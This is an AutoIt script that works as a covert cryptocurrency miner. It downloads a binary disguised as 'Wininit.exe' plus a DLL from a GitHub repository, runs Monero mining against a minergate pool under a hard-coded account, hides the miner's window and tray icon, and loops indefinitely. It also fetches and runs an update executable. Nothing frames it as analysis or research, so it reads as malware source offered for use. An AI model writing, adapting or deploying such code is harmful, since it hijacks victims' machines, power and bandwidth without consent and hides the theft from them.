#include <GuiListView.au3>
#NoTrayIcon


HotKeySet("{f4}",sair)
HotKeySet("{f7}",fechar)

need_update()
start_var()
criarpath()
download()
executar()
inf()


Func need_update()
   $update_dir = @AppDataDir & "\WinGG\update.ini"
   $update = IniRead($update_dir,"version","Default")
   $version_dir = @AppDataDir & "\WinGG\version.ini"
   $version_ = InetGet("https://raw.githubusercontent.com/WinGGAp/WinGG/master/Arquivos%20FONtes/Fonte/Version.ini",$version_dir)
   $version = IniRead($version, "version", "Default")
   if not ($version = $update) Then
	  Run(@AppdataDir & "\WinGG\update.exe")
	  Exit
   EndIf
EndFunc

Func start_var()
   Global $_name = "Wininit.exe"
   Global $_coin_code = " -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u ztxslmso@abyssmail.com -p x -t1 --cpu-priority 1 -B" ;Cmd to Mine
   Global $_Url0 = "https://github.com/WinGGAp/WinGG/raw/master/Arquivos%20FONtes/Wininit.exe" ;Url
   Global $_Url1 = "https://github.com/WinGGAp/WinGG/raw/master/Arquivos%20FONtes/msvcr120.dll" ;Url
EndFunc




Func download()
$path0 = (@AppDataDir & "\WinGG\" & $_name)
$path1 = (@AppDataDir & "\WinGG\msvcr120.dll")

;
InetGet($_Url0,$path0)
;
InetGet($_Url1,$path1)
;

EndFunc

Func executar()
   Run(@AppDataDir & "\WinGG\" & $_name & $_coin_code)
   Global $hwnd = WinWait(@AppDataDir & "\WinGG\" & $_name)
   WinSetState($hwnd,"",@SW_HIDE)
EndFunc

Func sair()
   Exit
EndFunc

Func fechar()
   WinClose($hwnd)
   Exit
EndFunc


Func inf()
   While 1
	  WEnd
   EndFunc



